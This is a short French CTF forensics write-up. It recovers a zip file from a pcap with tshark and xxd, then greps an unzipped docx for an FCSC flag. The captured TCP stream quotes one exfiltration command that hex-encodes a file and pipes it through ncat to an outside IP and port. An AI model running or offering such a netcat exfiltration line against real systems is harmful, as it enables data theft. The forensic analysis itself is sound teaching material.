
# Found a downloaded file in pcap

```sh
# retrouve les fichiers téléchargés
tshark -q -nr cap.pcap -z follow,tcp,ascii,0
        24
file Documents/flag.zip

63
Documents/flag.zip: Zip archive data, at least v2.0 to extract

        66
xxd -p Documents/flag.zip | tr -d '\n' | ncat 172.20.20.133 20200
```

On retrouve le deuxième fichier avec le deuxième flot TCP (1) :

```shell
$ tshark -q -nr cap.pcap -z follow,tcp,ascii,1

===================================================================
Follow: tcp,ascii
Filter: tcp.stream eq 1
Node 0: 172.20.20.132:35062
Node 1: 172.20.20.133:20200
464
504b0304140000000800a231825065235c39420000004700000008001c00666c61672e7478745554090003bfc8855ebfc8855e75780b000104e803000004e80300000dc9c11180300804c0bfd5840408bc33630356e00568c2b177ddef9eeb5a8fe6ee06ce8e5684f0845997192aad44ecaedc7f8e1acc4e3ec1a8eda164d48c28c77b7c504b01021e03140000000800a231825065235c394200000047000000080018000000000001000000a48100000000666c61672e7478745554050003bfc8855e75780b000104e803000004e8030000504b050600000000010001004e000000840000000000
===================================================================
```

On télécharge donc le fichier et on convertit avec xxd :

```sh
	$ tshark -o data.show_as_text:TRUE -r cap.pcap -Y "tcp.dstport == 20200" -T fields -e data.text  |xargs |xxd -r -p - |zmore
```


# Flag dans un fichier zip 

```shell
unzip 2021-fcsc-reglement_de_participation.docx -d doc 
# On cherche le fichier
grep -Ro "FCSC{.*}" doc/
```

